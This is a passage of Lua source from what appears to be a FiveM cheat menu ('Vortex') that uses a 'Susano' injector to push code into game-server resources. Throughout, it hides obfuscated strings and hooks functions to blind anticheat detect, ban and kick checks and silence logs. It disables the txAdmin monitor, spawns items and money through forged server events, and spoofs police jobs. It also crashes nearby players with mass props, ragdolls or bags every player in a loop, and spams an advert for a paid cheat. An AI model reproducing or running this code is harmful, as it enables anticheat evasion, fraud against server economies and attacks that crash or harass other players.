                    (function()local k=4;local b={102,125,116,101,119,119};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=5;local b={102,104,63};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=7;local b={104,117,123,112,106,111,108,104,123};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=13;local b={111,110,123};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=9;local b={116,114,108,116};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=17;local b={125,128,120};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=11;local b={125,112,123,122,125,127};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)()
                }) do _tb[w] = true end
                Citizen.Trace = function(m)
                    if m and type(m) == "string" then
                        local l = string.lower(m)
                        for kw in pairs(_tb) do
                            if l:find(kw, 1, true) then return end
                        end
                    end
                    if t then t(m) end
                end
            end

            local _d = function(b,k)local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end
            local _bl = {}
            for _,w in ipairs({
                _d({115,116,131,116,114,131},15),
                _d({139,126,132,129,118,137,126,132,131},21),
                _d({106,111,108,104,123},9),
                _d({111,110,123},13),
                _d({116,114,108,116},9),
                _d({125,128,120},17),
                _d({121,116,119,118,121,125},11),
                _d({102,104,63},5)
            }) do _bl[w] = true end

            local _chk = function(nm)
                if nm and type(nm)=="string" then
                    local l=string.lower(nm)
                    for kw in pairs(_bl) do
                        if l:find(kw,1,true) then return true end
                    end
                end
                return false
            end

            local ts = rawget(_G, _d({131,161,152,150,150,148,161,130,148,161,165,148,161,116,165,148,157,163},47))
            local te = rawget(_G, _d({97,118,108,104,104,102,118,116,121,102,115,119},13))
            local ae = rawget(_G, _d({70,105,105,74,121,110,119,114,77,107,119,105,118,110,121},5))
            local rn = rawget(_G, _d({93,112,110,116,124,125,112,123,85,112,125,72,127,112,117,125},11))

            if ts then
                rawset(_G, _d({131,161,152,150,150,148,161,130,148,161,165,148,161,116,165,148,157,163},47), function(n, ...)
                    if _chk(n) then return end
                    return ts(n, ...)
                end)
            end

            if te then
                rawset(_G, _d({97,118,108,104,104,102,118,116,121,102,115,119},13), function(n, ...)
                    if _chk(n) then return end
                    return te(n, ...)
                end)
            end

            if ae then
                rawset(_G, _d({70,105,105,74,121,110,119,114,77,107,119,105,118,110,121},5), function(n, h)
                    if _chk(n) then return end
                    return ae(n, h)
                end)
            end

            if rn then
                rawset(_G, _d({93,112,110,116,124,125,112,123,85,112,125,72,127,112,117,125},11), function(n)
                    if _chk(n) then return end
                    return rn(n)
                end)
            end

            if exports then
                local ex = exports
                exports = setmetatable({}, {
                    __index = function(t, k)
                        local r = ex[k]
                        if type(r) == "table" then
                            return setmetatable({}, {
                                __index = function(t2, k2)
                                    local f = r[k2]
                                    if type(f) == "function" then
                                        local lk = string.lower(tostring(k))
                                        local lk2 = string.lower(tostring(k2))
                                        if string.find(lk, "ac") or string.find(lk, "anticheat") or
                                           string.find(lk2, "detect") or string.find(lk2, "check") or
                                           string.find(lk2, "ban") or string.find(lk2, "kick") then
                                            return function() return true end
                                        end
                                    end
                                    return f
                                end
                            })
                        end
                        return r
                    end
                })
            end
        ]])

        Wait(50)

        Susano.InjectResource(targetResource, [[
            local s = rawget(_G, "Susano")
            if s and type(s) == "table" and type(s.HookNative) == "function" then
                s.HookNative(0x2B40A976, function() return 0 end)
                s.HookNative(0x5324A0E3E4CE3570, function() return false end)
                s.HookNative(0x8DE82BC774F3B862, function() return nil end)
                s.HookNative(0x2B1813BA58063D36, function() return "core" end)
            end

            local pr = {
                ["TriggerEvent"] = true, ["Wait"] = true, ["Citizen"] = true,
                ["CreateThread"] = true, ["GetEntityCoords"] = true,
                ["PlayerPedId"] = true, ["GetHashKey"] = true
            }

            local bp = {"detect", "check", "ban", "kick", "log", "report", "monitor", "track", "verify", "ac", "anticheat"}

            for n, f in pairs(_G) do
                if not pr[n] and type(f) == "function" then
                    local nl = string.lower(tostring(n))
                    for _, p in ipairs(bp) do
                        if string.find(nl, p) then
                            _G[n] = function() return true end
                            break
                        end
                    end
                end
            end
        ]])
    end,

    eventlogger = function()
        vortex_eventloggerEnabled = not vortex_eventloggerEnabled

        if vortex_eventloggerEnabled then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                local allResources = {}
                local numResources = GetNumResources()

                for i = 0, numResources - 1 do
                    local resourceName = GetResourceByFindIndex(i)
                    if resourceName and resourceName ~= "" then
                        local resourceState = GetResourceState(resourceName)
                        if resourceState == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                end

                local injectedCount = 0
                for _, resourceToHook in ipairs(allResources) do
                    Susano.InjectResource(resourceToHook, [[
        local function tryDecode(value)
            if type(value) == "string" then
                local ok, decoded = pcall(function() return json and json.decode and json.decode(value) end)
                if ok and type(decoded) == "table" then
                    return decoded
                end

                if string.match(value, "^[A-Za-z0-9+/=]+$") and #value % 4 == 0 then
                    local ok2, decoded2 = pcall(function()
                        return util and util.Base64Decode and util.Base64Decode(value) or nil
                    end)
                    if ok2 and decoded2 then
                        return decoded2
                    end
                end
            end
            return value
        end

        local function formatNUI(data, depth)
            depth = depth or 0
            if depth > 3 then return "{...}" end
            if type(data) ~= "table" then return tostring(data) end

            local result = "{"
            for k, v in pairs(data) do
                v = tryDecode(v)
                if type(v) == "string" then
                    result = result .. k .. "='" .. v .. "',"
                elseif type(v) == "table" then
                    result = result .. k .. "=" .. formatNUI(v, depth + 1) .. ","
                else
                    result = result .. k .. "=" .. tostring(v) .. ","
                end
            end
            return result .. "}"
        end

        local function formatArgs(...)
            local args = {...}
            local str = ""
            for i, v in ipairs(args) do
                v = tryDecode(v)
                if type(v) == "string" then
                    str = str .. "'" .. v .. "'"
                elseif type(v) == "table" then
                    str = str .. formatNUI(v)
                else
                    str = str .. tostring(v)
                end
                if i < #args then str = str .. "," end
            end
            return str
        end

        local originalTriggerServer = TriggerServerEvent

        _G.TriggerServerEvent = function(eventName, ...)
            print(string.format("[%s] TriggerServerEvent('%s',%s)", "]] .. resourceToHook .. [[", eventName, formatArgs(...)))
            return originalTriggerServer(eventName, ...)
        end

        print("^2[Logger]^0 Logger injectÃ© dans la ressource ]] .. resourceToHook .. [[!")
        print("^3[Info]^0 Surveillance des TriggerServerEvent avec dÃ©codage amÃ©liorÃ© active")
]])
                    injectedCount = injectedCount + 1
                end
                print("^2[EVENT LOGGER] Logger activÃ© et injectÃ© dans ^5" .. injectedCount .. "^2 ressources^7")
            else
                print("^1[EVENT LOGGER] Susano.InjectResource non disponible!^7")
                vortex_eventloggerEnabled = false
            end
        else
            print("^3[EVENT LOGGER] Logger dÃ©sactivÃ©^7")
        end
    end,

    txadminplayerids = function()
        vortex_txAdminPlayerIDsEnabled = not vortex_txAdminPlayerIDsEnabled

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            if vortex_txAdminPlayerIDsEnabled then
                Susano.InjectResource("monitor", [[
                    menuIsAccessible = true
                    toggleShowPlayerIDs(true, true)
                ]])
            else
                Susano.InjectResource("monitor", [[
                    menuIsAccessible = true
                    toggleShowPlayerIDs(false, true)
                ]])
            end
        end
    end,

    txadminnoclip = function()
        vortex_txAdminNoclipEnabled = not vortex_txAdminNoclipEnabled

        if vortex_txAdminNoclipEnabled then
            if GetResourceState("WaveShield") == "started" then
                local _te = rawget(_G, "TriggerEvent")
                if _te then _te("txcl:setPlayerMode", "noclip", true) end
            else
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource("monitor", [[
                        menuIsAccessible = true
                        toggleShowPlayerIDs(true, true)
                    ]])
                end
            end
        else
            if GetResourceState("WaveShield") == "started" then
                local _te = rawget(_G, "TriggerEvent")
                if _te then _te("txcl:setPlayerMode", "none", true) end
            else
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource("monitor", [[
                        menuIsAccessible = true
                        toggleShowPlayerIDs(false, true)
                    ]])
                end
            end
        end
    end,

    disablealltxadmin = function()
        vortex_disableAllTxAdminEnabled = not vortex_disableAllTxAdminEnabled

        if vortex_disableAllTxAdminEnabled then
            StopResource("monitor")
            print('started')
        else
            print('stopped')
            StartResource("monitor")
        end
    end,

    disabletxadminteleport = function()
        vortex_disableTxAdminTeleportEnabled = not vortex_disableTxAdminTeleportEnabled

        if vortex_disableTxAdminTeleportEnabled then
            StopResource("monitor")
            print('started')
        else
            print('stopped')
            StartResource("monitor")
        end
    end,

    disabletxadminfreeze = function()
        vortex_disableTxAdminFreezeEnabled = not vortex_disableTxAdminFreezeEnabled

        if vortex_disableTxAdminFreezeEnabled then
            StopResource("monitor")
            print('started')
        else
            print('stopped')
            StartResource("monitor")
        end
    end,

    deobfuscateevents = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local resourceName = nil

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                resourceName = GetOnscreenKeyboardResult()
            end

            if not resourceName or resourceName == "" then
                print("^1[ERROR] No resource name entered^7")
                return
            end

            if GetResourceState(resourceName) ~= "started" then
                print("^1[ERROR] Resource ^3" .. resourceName .. "^7 is not started or doesn't exist^7")
                return
            end

            local payload = [[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116})

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]]

            Susano.InjectResource(resourceName, payload)
            print("^2[TRIGGERS] Hooks injected into ^3" .. resourceName .. "^2 successfully!^7")
        end
    end,

    crashnearbyplayers = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("ox_lib", [[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
            ]])
        end
    end,

    bringallnearbyplayers = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local targetRes = (GetResourceState("dpemotes") == "started" and "dpemotes") or "framework"
            local preamble, tbl = vortex_buildObfPreamble()
            local call = string.format("%s[2](%s, %s, %s, %s)",
                tbl,
                vortex_encStr("ServerValidEmote"),
                vortex_encStr("-1"),
                vortex_encStr("horse"),
                vortex_encStr("horse"))
            Susano.InjectResource(targetRes, preamble .. "\n" .. call)
        end
    end,

    adminmenulist = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("mc9-adminmenu", [[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                    end
                end
            ]])
        end
    end,

    messageserver = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local preamble, tbl = vortex_buildObfPreamble()
            local msg = "Hello this is repercing with OSINT Bypass, the leading cheat in the market. Join our discord at https://discord.gg/6zXK6wNu"
            local call = string.format("%s[2](%s, -1, %s)",
                tbl,
                vortex_encStr("vMenu:SendMessageToPlayer"),
                vortex_encStr(msg))
            Susano.InjectResource("any", preamble .. "\n" .. call)
        end
    end,

    giveitem1 = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local itemName = nil
            local itemCount = 1

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                itemName = GetOnscreenKeyboardResult()
            end

            if not itemName or itemName == "" then
                print("^1[ERROR] No item name entered^7")
                return
            end

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "1", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                itemCount = tonumber(GetOnscreenKeyboardResult()) or 1
            end

            if itemCount > 100000 then itemCount = 100000 end

            local preamble, tbl = vortex_buildObfPreamble()
            local call = string.format("%s[2](%s, { item = %s, count = %d })",
                tbl,
                vortex_encStr("player:giveItem"),
                vortex_encStr(itemName),
                itemCount)
            Susano.InjectResource("amigo", preamble .. "\n" .. call)
        end
    end,

    endcomserv = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local runningResource = (GetResourceState("scripts") == "started" and "scripts") or "framework"
            Susano.InjectResource(runningResource, [[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function g(n) return _G[decode(n)] end

                for i = 1, 1 do
                    lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                    g({87,97,105,116})(0)
                end
            ]])
        end
    end,

    setjobpolice1 = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local targetRes = (GetResourceState("es_extended") == "started" and "es_extended") or "core"
            Susano.InjectResource(targetRes, [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "core/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "police",
                    label = "Police",
                    grade = 3,
                    grade_name = "lieutenant",
                    grade_label = "Lieutenant"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]])
        end
    end,

    setjobpolice2 = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                local lp = LocalPlayer
                if lp and lp.state then
                    lp.state:set("job", {
                        name = "police",
                        label = "Police",
                        grade = 4,
                        grade_name = "sergeant"
                    }, true)
                    print("[âœ…] Job set to police successfully.")
                else
                    print("[âš ï¸] Failed to set job: LocalPlayer or state not available.")
                end
            ]])
        end
    end,

    giveshoesreward = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local preamble, tbl = vortex_buildObfPreamble()
            local call = string.format("%s[2](%s, 1000)", tbl, vortex_encStr("delivery:giveRewardShoes"))
            Susano.InjectResource("codewave-sneaker-phone", preamble .. "\n" .. call)
        end
    end,

    ragdollplayersrzrp = function()
        if not vxGet('ragdollPlayersRZRPEnabled') then
            vxSet('ragdollPlayersRZRPEnabled', false)
        end
        vxSet('ragdollPlayersRZRPEnabled', not vxGet('ragdollPlayersRZRPEnabled'))

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            if vxGet('ragdollPlayersRZRPEnabled') then
                local swCode, sw = vortex_buildSafeWrap()
                local gEn  = vortex_randVar("rg")
                local gInit = vortex_randVar("ri")
                local gThr  = vortex_randVar("rt")
                local evtEnc = vortex_encStr("RZRP:Player:Slap")
                local distFn = vortex_randVar("d")
                local payload = string.format([[
                    if not _G["%s"] then
                        _G["%s"] = true
                        _G["%s"] = true
                        %s
                        local function %s(a,b) return #(a-b) end
                        if _G["%s"] then
                            rawget(_G,%s)(_G["%s"])
                            _G["%s"] = nil
                        end
                        _G["%s"] = %s(function()
                            while _G["%s"] and _G["%s"] do
                                local myPed = PlayerPedId()
                                local myCoords = %s(myPed)
                                if not myCoords then break end
                                local players = %s()
                                if not players then break end
                                for _, pid in ipairs(players) do
                                    local targetPed = %s(pid)
                                    if targetPed and targetPed ~= myPed then
                                        local tc = %s(targetPed)
                                        if tc and %s(myCoords,tc) <= 30000.0 then
                                            local sid = %s(pid)
                                            if sid then %s(%s, sid) end
                                        end
                                    end
                                end
                                %s(2000)
                            end
                            _G["%s"] = nil
                        end)
                    else
                        _G["%s"] = true
                    end
                ]],
                    gInit, gInit, gEn,
                    swCode,
                    distFn,
                    gThr, vortex_encStr("TerminateThread"), gThr, gThr,
                    gThr, sw.CreateThread,
                    gEn, gInit,
                    sw.GetEntityCoords,
                    sw.GetActivePlayers,
                    sw.GetPlayerPed,
                    sw.GetEntityCoords,
                    distFn,
                    sw.GetPlayerServerId,
                    sw.TriggerServerEvent, evtEnc,
                    sw.Wait,
                    gThr,
                    gEn)
                Susano.InjectResource("rzrp-base", payload)
            else
                local gEn  = vortex_randVar("rg")
                local gInit = vortex_randVar("ri")
                local gThr  = vortex_randVar("rt")
                Susano.InjectResource("rzrp-base", string.format([[
                    _G["%s"] = false
                    _G["%s"] = false
                    if _G["%s"] then
                        rawget(_G,%s)(_G["%s"])
                        _G["%s"] = nil
                    end
                ]], gEn, gInit, gThr, vortex_encStr("TerminateThread"), gThr, gThr))
            end
        end
    end,

    bagclosestplayersrzrp = function()
        if not vxGet('bagPlayersRZRPEnabled') then
            vxSet('bagPlayersRZRPEnabled', false)
        end
        vxSet('bagPlayersRZRPEnabled', not vxGet('bagPlayersRZRPEnabled'))

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            if vxGet('bagPlayersRZRPEnabled') then
                local swCode, sw = vortex_buildSafeWrap()
                local gEn  = vortex_randVar("bg")
                local gInit = vortex_randVar("bi")
                local gThr  = vortex_randVar("bt")
                local evtEnc = vortex_encStr("RZRP:Player:BagClosestPlayer")
                local distFn = vortex_randVar("d")
                local payload = string.format([[
                    if not _G["%s"] then
                        _G["%s"] = true
                        _G["%s"] = true
                        %s
                        local function %s(a,b) return #(a-b) end
                        if _G["%s"] then
                            rawget(_G,%s)(_G["%s"])
                            _G["%s"] = nil
                        end
                        _G["%s"] = %s(function()
                            while _G["%s"] and _G["%s"] do
                                local myPed = PlayerPedId()
                                local myCoords = %s(myPed)
                                if not myCoords then break end
                                local players = %s()
                                if not players then break end
                                for _, pid in ipairs(players) do
                                    local targetPed = %s(pid)
                                    if targetPed and targetPed ~= myPed then
                                        local tc = %s(targetPed)
                                        if tc and %s(myCoords,tc) <= 300000.0 then
                                            local sid = %s(pid)
                                            if sid then %s(%s, sid) end
                                        end
                                    end
                                end
                                %s(2000)
                            end
                            _G["%s"] = nil
                        end)
                    else
                        _G["%s"] = true
                    end
                ]],
                    gInit, gInit, gEn,
                    swCode,
                    distFn,
                    gThr, vortex_encStr("TerminateThread"), gThr, gThr,
                    gThr, sw.CreateThread,
                    gEn, gInit,
                    sw.GetEntityCoords,
                    sw.GetActivePlayers,
                    sw.GetPlayerPed,
                    sw.GetEntityCoords,
                    distFn,
                    sw.GetPlayerServerId,
                    sw.TriggerServerEvent, evtEnc,
                    sw.Wait,
                    gThr,
                    gEn)
                Susano.InjectResource("rzrp-base", payload)
            else
                local gEn  = vortex_randVar("bg")
                local gInit = vortex_randVar("bi")
                local gThr  = vortex_randVar("bt")
                Susano.InjectResource("rzrp-base", string.format([[
                    _G["%s"] = false
                    _G["%s"] = false
                    if _G["%s"] then
                        rawget(_G,%s)(_G["%s"])
                        _G["%s"] = nil
                    end
                ]], gEn, gInit, gThr, vortex_encStr("TerminateThread"), gThr, gThr))
            end
        end
    end,

    setgang = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local gangName = ""
            local gangRank = 1

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                gangName = GetOnscreenKeyboardResult()
            end

            Citizen.Wait(500)

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "1", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                gangRank = tonumber(GetOnscreenKeyboardResult()) or 1
            end

            local targetResource = (GetResourceState("scripts") == "started" and "scripts") or "framework"
            Susano.InjectResource(targetResource, string.format([[
                LocalPlayer.state:set("gang", "%s", true)
                LocalPlayer.state:set("gang_rank", %d, true)
            ]], gangName, gangRank))
        end
    end,

    giveitem2 = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local itemName = nil
            local itemCount = 1

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                itemName = GetOnscreenKeyboardResult()
            end

            if not itemName or itemName == "" then
                print("^1[ERROR] No item name entered^7")
                return
            end

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "1", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                itemCount = tonumber(GetOnscreenKeyboardResult()) or 1
            end

            if itemCount > 100000 then itemCount = 100000 end

            local tseCall = vortex_obfTSE("drugs:receive",
                string.format("{ Reward = { Name = %s, Amount = %d } }",
                    vortex_encStr(itemName), itemCount))
            Susano.InjectResource("framework", tseCall)
        end
    end,

    giveitem3 = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local fnName = vortex_randVar("fn")
            local code = string.format("local function %s() %s end; %s()",
                fnName,
                vortex_obfTSE("waytoocerti_3dprinter:CompletePurchase",
                    vortex_encStr("money") .. ", 10000"),
                fnName)
            Susano.InjectResource("WayTooCerti_3D_Printer", code)
        end
    end,

    setchattag = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local tagName = ""
            local colorInput = "0, 255, 0"

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                tagName = GetOnscreenKeyboardResult()
            end

            if not tagName or tagName == "" then
                return
            end

            Citizen.Wait(500)

            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "0, 255, 0", "", "", "", "", 64)
            while UpdateOnscreenKeyboard() == 0 do
                Citizen.Wait(0)
            end
            if GetOnscreenKeyboardResult() then
                colorInput = GetOnscreenKeyboardResult()
            end
            if not colorInput or colorInput == "" then
                colorInput = "255, 255, 255"
            end

            local targetResource = (GetResourceState("scripts") == "started" and "scripts") or "framework"
            Susano.InjectResource(targetResource, string.format([[
                LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
            ]], tagName, colorInput))
        end
    end,

    setjobpolice3 = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("wasabi_multijob", [[
                local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
                CheckJob(job, true)
            ]])
            Susano.InjectResource("wasabi_multijob", [[
                SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
            ]])
        end
    end,

    setjobems = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("wasabi_multijob", [[
                local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
                CheckJob(job, true)
            ]])
            Susano.InjectResource("wasabi_multijob", [[
                SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
            ]])
        end
    end,

    electronacadminpanel = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("ElectronAC", [[
                SetNuiFocus(true, true)
                SendNUIMessage({
                    action = "menu",
                    data = {
                        info = {
                            adminContext = {
                                master = true,
                                permissions = { "all" }
                            },
                            identifiers = {
                                ["ip"] = "127.0.0.1",
                                ["license"] = "",
                                ["license2"] = "",
                            },
                            permissions = {
                                adminMenu = true,
                                whitelisted = true
                            }
                        },
                        open = true,
                        setOpen = true
                    }
                })
            ]])
        end
    end,

    givemoney1 = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local preamble, tbl = vortex_buildObfPreamble()
            local call = string.format("%s[2](%s, 1000000)", tbl, vortex_encStr("spoodyFraud:giveMoney"))
            Susano.InjectResource("spoodyFraud", preamble .. "\n" .. call)
        end
    end,

    copyappearance = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        local myPed = PlayerPedId()

        if not DoesEntityExist(targetPed) or not DoesEntityExist(myPed) then
            return
        end

        SetPedComponentVariation(myPed, 1, GetPedDrawableVariation(targetPed, 1), GetPedTextureVariation(targetPed, 1), 0)
        SetPedComponentVariation(myPed, 3, GetPedDrawableVariation(targetPed, 3), GetPedTextureVariation(targetPed, 3), 0)
        SetPedComponentVariation(myPed, 4, GetPedDrawableVariation(targetPed, 4), GetPedTextureVariation(targetPed, 4), 0)
        SetPedComponentVariation(myPed, 6, GetPedDrawableVariation(targetPed, 6), GetPedTextureVariation(targetPed, 6), 0)
        SetPedComponentVariation(myPed, 8, GetPedDrawableVariation(targetPed, 8), GetPedTextureVariation(targetPed, 8), 0)
        SetPedComponentVariation(myPed, 11, GetPedDrawableVariation(targetPed, 11), GetPedTextureVariation(targetPed, 11), 0)

        SetPedPropIndex(myPed, 0, GetPedPropIndex(targetPed, 0), GetPedPropTextureIndex(targetPed, 0), true)
        SetPedPropIndex(myPed, 1, GetPedPropIndex(targetPed, 1), GetPedPropTextureIndex(targetPed, 1), true)
        SetPedPropIndex(myPed, 2, GetPedPropIndex(targetPed, 2), GetPedPropTextureIndex(targetPed, 2), true)
    end,

    shootplayer = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetSelectedPedWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                hNative("HasPedGotWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetOffsetFromEntityInWorldCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

